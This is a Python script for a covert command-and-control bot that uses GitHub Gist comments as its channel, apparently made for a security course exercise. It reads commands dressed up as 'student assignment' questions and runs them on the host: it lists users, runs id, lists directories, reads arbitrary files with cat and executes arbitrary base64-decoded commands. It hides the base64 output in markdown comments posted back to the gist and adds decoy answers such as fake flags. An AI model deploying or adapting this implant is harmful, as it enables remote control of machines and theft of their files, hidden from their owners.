#!/usr/bin/python3
import sys
import requests
import json
import time
from datetime import datetime
import subprocess
import base64
import random
import string


class Git:

    def __init__(self, github_gist_api, api_token):
        self.GITHUB_GIST_API = github_gist_api
        self.API_TOKEN = api_token
        self.gist_id = ""

    def dont_have_gist(self):
        return self.gist_id == ""

    def get_and_set_gist_id(self, gist_name):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}

        res = requests.get(self.GITHUB_GIST_API, headers=headers, params=params)

        if res.status_code != 200:
            print("Unable to get all gists. Statu code " + str(res.status_code))
            print(res.text)

        last_updated = ""
        for gist in json.loads(res.text):
            if gist_name in gist['files'].keys():
                if last_updated == "" or gist['updated_at'] > last_updated:
                    last_updated = gist['updated_at']
                    self.gist_id = gist['id']
        if self.gist_id == "":
            print("Unable to find gist " + gist_name + ".")
            return
        print("Using gist with id: " + self.gist_id)

    def add_comment_to_gist(self, content):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        payload = {"body": content}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.post(url, headers=headers, data=json.dumps(payload))
        if res.status_code != 201:
            print("Unable to add comment to gist. Statu code " + str(res.status_code))
            print(res.text)
            if res.status_code == 404:
                self.gist_id = ""

    def get_gist_comments(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.get(url, headers=headers, params=params)
        if res.status_code != 200:
            print("Unable to get gist's comments " + self.gist_id + ". Statu code " + str(res.status_code))
            print(res.text)
            if res.status_code == 404:
                self.gist_id = ""
                return []

        return json.loads(res.text)


def get_ip_in_hex():
    value = requests.get('https://api.ipify.org').content.decode('utf8')
    return value.encode("utf-8").hex()


def execute_command(command):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    return process.communicate()


def generate_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def get_users(git, message):
    comment_message = "> " + message[0]
    comment_message += "\n\nStudent with id " + ip + " answered: \n\n"
    bash_command = "w"
    try:
        output, error = execute_command(bash_command)
    except:
        return
    lines = output.splitlines()
    for i in range(2, len(lines)):
        line = lines[i]
        comment_message += "- " + str(line.split()[0].decode("utf-8")) + "\n"

    git.add_comment_to_gist(comment_message)


def get_content_of_directory(git, message):
    comment_message = "> " + message[0]
    comment_message += "\n\nStudent with id " + ip + " answered: \nI found one file flag.txt\n\n"
    bash_command = "ls -al " + str(base64.b64decode(message[3].split()[3]).decode("utf-8"))
    try:
        output, error = execute_command(bash_command)
    except:
        return
    comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"

    git.add_comment_to_gist(comment_message)


def get_username(git, message):
    comment_message = "> " + message[0]
    comment_message += "\n\nStudent with id " + ip + " answered: \n" + str(int(random.random() * 100)) + "\n\n"
    bash_command = "id"
    try:
        output, error = execute_command(bash_command)
    except:
        return
    comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"

    git.add_comment_to_gist(comment_message)


def copy_file(git, message):
    comment_message = "> " + message[0]
    comment_message += "\n\nStudent with id " + ip + " answered: \nThe flag is BSY{"
    comment_message += generate_random_string(16)
    comment_message += "}\n\n"
    bash_command = "cat " + str(base64.b64decode(message[3].split()[3]).decode("utf-8"))
    try:
        output, error = execute_command(bash_command)
    except:
        return
    comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"

    git.add_comment_to_gist(comment_message)


def execute_command_task(git, message):
    comment_message = "> " + message[0]
    comment_message += "\n\nStudent with id " + ip + " answered: \n"
    comment_message += generate_random_string(8)
    comment_message += ".ru\n\n"
    bash_command = str(base64.b64decode(message[3].split()[3]).decode("utf-8"))+" &"
    try:
        output, error = execute_command(bash_command)
    except:
        return
    git.add_comment_to_gist(comment_message)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
        exit(1)

    github_gist_api = "https://api.github.com/gists"
    api_token = sys.argv[1]
    gist_name = sys.argv[2]
    git_instance = Git(github_gist_api, api_token)
    last_comment_check = datetime.utcnow()
    ip = get_ip_in_hex()
    date_format = "%Y-%m-%dT%H:%M:%SZ"

    while True:
        while git_instance.dont_have_gist():
            git_instance.get_and_set_gist_id(gist_name)
            time.sleep(5)

        new_comments = []
        for comment in git_instance.get_gist_comments():
            if datetime.strptime(comment['updated_at'], date_format) > last_comment_check \
                    and comment['body'].startswith("# Assignment "):
                new_comments.append(comment)
        for comment in new_comments:
            date_time = datetime.strptime(comment['updated_at'], date_format)
            if date_time > last_comment_check:
                last_comment_check = date_time
            body = comment['body'].splitlines()
            if body[1].startswith("Students, what users do you see"):
                get_users(git_instance, body)
            elif body[1].startswith("Students, what is the content"):
                get_content_of_directory(git_instance, body)
            elif body[1].startswith("Students, what is the answer"):
                get_username(git_instance, body)
            elif body[1].startswith("Students, find and write here"):
                copy_file(git_instance, body)
            elif body[1].startswith("Students, there has been a breach"):
                execute_command_task(git_instance, body)
            elif body[1].startswith("Students, there has been a breach"):
                execute_command_task(git_instance, body)
        time.sleep(5)
